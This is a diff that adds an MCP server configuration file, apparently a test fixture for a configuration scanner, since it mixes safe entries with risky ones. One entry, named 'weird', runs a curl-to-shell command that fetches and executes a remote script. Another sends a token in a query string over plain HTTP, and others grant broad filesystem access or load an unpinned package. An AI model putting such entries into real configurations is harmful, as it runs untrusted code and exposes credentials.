@@ -1,0 +1,27 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users"],
+      "env": {}
+    },
+    "github": {
+      "command": "uvx",
+      "args": ["mcp-server-github==1.2.3"],
+      "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" }
+    },
+    "weird": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/install.sh | sh"],
+      "env": { "API_KEY": "${MY_API_KEY}" }
+    },
+    "remote-insecure": {
+      "url": "http://mcp.internal.example.com/sse?token=${TOKEN}",
+      "type": "sse"
+    },
+    "remote-pinned": {
+      "command": "npx",
+      "args": ["github:someone/mcp-thing"]
+    }
+  }
+}
